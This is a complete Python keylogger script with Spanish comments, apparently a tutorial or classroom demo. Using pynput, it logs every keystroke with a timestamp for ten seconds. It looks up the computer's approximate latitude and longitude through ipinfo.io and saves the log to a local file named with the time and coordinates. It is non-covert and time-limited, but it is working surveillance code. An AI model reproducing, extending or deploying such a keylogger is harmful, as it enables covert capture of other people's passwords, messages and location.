# En este keylogger se guarda fecha y hora de cada tecleada
# Primero se instala pynput con el siguiente comando "pip install pynput"
# Luego de bajar librerias, las importamos
from pynput import keyboard
from datetime import datetime
import time
import requests

# Duración en segundos
DURACION = 10

# En el siguiente codigo se muestra como obtener ubicacion de un dispositivo 
# guarda longitud y latititud del computador
def obtener_lat_lon():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        data = response.json()
        loc = data.get("loc", "")  # formato: "lat,lon"
        if loc:
            lat, lon = loc.split(",")
            return f"{lat}_{lon}"
        else:
            return "LatLon_Desconocida"
    except Exception:
        return "LatLon_Error"

# Se crean el archivo con los datos del keylogger
def crear_nombre_archivo():
    fecha_hora = datetime.now().strftime("%y%m%d_%H%M%S")
    lat_lon = obtener_lat_lon()
    return f"Keylogger_Windows_{fecha_hora}_{lat_lon}.txt"

# Lista para guardar los registros
registro_teclas = []

# Con el siguiente codigo se guarda tecla presionada
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)
    registro_teclas.append(f"[{timestamp}] {tecla}")

# Iniciar escucha
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("(+) Se guardaran las teclas usadas por 10 sengundos..")
time.sleep(DURACION)
listener.stop()

# Guardar en archivo
nombre_archivo = crear_nombre_archivo()
with open(nombre_archivo, "w", encoding="utf-8") as f:
    f.write("Registro de teclas con fecha y hora:\n\n")
    for entrada in registro_teclas:
        f.write(entrada + "\n")

print(f"(+) Archivo con el informe keylogger se guardo como: {nombre_archivo}")

